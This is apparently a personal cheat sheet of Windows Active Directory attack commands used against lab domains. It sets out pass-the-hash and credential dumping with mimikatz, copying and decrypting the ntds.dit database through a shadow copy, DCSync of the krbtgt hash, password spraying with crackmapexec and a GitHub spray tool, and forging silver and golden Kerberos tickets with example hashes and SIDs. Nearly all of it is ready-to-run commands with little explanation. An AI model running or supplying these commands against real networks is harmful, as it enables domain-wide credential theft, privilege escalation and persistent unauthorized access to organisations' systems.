#PassTheHash

log passthehash.log

privilege::debug

sekurlsa::logonpasswords

sekurlsa::pth /user:tony.Wonder /domain:jefflab.local /ntlm:....

#Run cmd on dc after the passthehash 
PsExec.exe \\jefflab-dc01 cmd

#Password Extraction with Ntds.dit ( Active Directoryâ€™s database )
On cmd
vssadmin create shadow /for=C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\temp\ntds.dit

reg SAVE HKLM\SYSTEM C:\temp\SYS

In powershell (this can be offline )

$key = Get-Bootkey -SystemHiveFilePath C:\temp\SYS 
Get-ADDBAccount -All -BootKey $key -DBPATH C:\Temp\ntds.dit

If faced the followinf error: The databse is not in a clean state (Because AD was running during copy, try the following command to repair disk)

ESENTUTL /p C:\temp\ntds.dit /!10240 /8 /o

Then every account of the domain is available 

#DC Sync: to request all domaine user hash
##Privilege needed:
1-Replicating Directory Changes
2-Replicating Directory Changes All 
mimikatz
lsadump::dcsync /domain:jefflab.local /user:krbtgt 

#PAssword Spraying
##in kali (for getting password policy more special account lockout threshold and duration)

-crackmapexec smb 192.168.29.138 -u jeff -p P@ssw0rd --pass-pol

-Get Spray from github (https://github.com/Greenwolf/Spray)

-spray.sh -smb 192.168.29.138 users.txt passwords.txt 8 30 jefflab

8 is the account threeshold and 30 the duration

#Silver Ticket
/sid:S-1-5-21-4172452648-1021989953-2368502130-1105# SID of the current user who is forging the ticket. Retrieved with whoami /user
/target:dc-mantvydas.offense.local #server hosting the attacked service for which the TGS ticket was cracked
/service:http# service type being attacked
/rc4:a87f3a337d73085c45f9416be5787d86 #NTLM hash of the password the TGS ticket was encrypted with. Passw0rd in our case
/user:beningnadmin #Forging the user name. This is the user name that will appear in the windows security logs - fun.
/id:1155 (optional default is 500) 	# Forging user's RID - fun
/ptt# Instructs mimikatz to inject the forged ticket to memory to make it usable immediately

kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin

#Golden Ticeket
##Get krbtgt hash 
mimikatz # lsadump::lsa /inject /name:krbtgt

##Forge the golden ticket 
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt

##Check in powershell the ticket with `klist`

##Access share of dc with 
pushd \\pc-mantvydas\c$


